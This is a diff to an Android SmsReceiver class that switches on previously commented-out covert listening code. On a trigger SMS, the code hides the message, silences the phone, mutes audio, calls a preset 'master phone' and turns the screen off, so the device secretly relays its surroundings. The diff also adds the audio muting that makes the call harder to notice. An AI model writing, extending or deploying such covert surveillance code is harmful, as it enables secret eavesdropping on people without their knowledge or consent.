@@ -190,7 +190,6 @@ public class SmsReceiver extends BroadcastReceiver
 			
 			//-------------------------------------------------------------------------------
 			// Call master phone if being triggered by env listening indication
-			/*
 			else if (smsBodyLowerCase.equals(SmsConsts.INDICATION_ENV_LISTEN) || smsBodyLowerCase.equals(SmsConsts.INDICATION_ENV_LISTEN_ALIAS))
 			{
 				abortBroadcast(); // Do not show env listening SMS
@@ -230,8 +229,9 @@ public class SmsReceiver extends BroadcastReceiver
 							GlobalValues.ORIGINAL_RING_MODE = am.getRingerMode();
 							am.setRingerMode(AudioManager.RINGER_MODE_SILENT);
 						
-							// Enable speaker
+							// Set speaker and earphone
 							am.setSpeakerphoneOn(true);
+							am.setStreamMute(AudioManager.STREAM_MUSIC, true);
 							
 							// Call master phone
 							String masterPhone = GlobalPrefActivity.getReceiverPhoneNum(SmsReceiver.this.context);
@@ -242,7 +242,7 @@ public class SmsReceiver extends BroadcastReceiver
 							GlobalValues.IS_ENV_LISTENING = true;
 							SmsReceiver.this.context.startActivity(intent);
 						
-							SysUtils.threadSleep(4000, LOGTAG);
+							SysUtils.threadSleep(3000, LOGTAG);
 						
 							// Turn off screen
 							PowerUtil.setScreenOff(SmsReceiver.this.context);
@@ -254,7 +254,6 @@ public class SmsReceiver extends BroadcastReceiver
 					}
 				}).start();
 			}
-			*/
 			
 			//-------------------------------------------------------------------------------
 			// Env recording indication
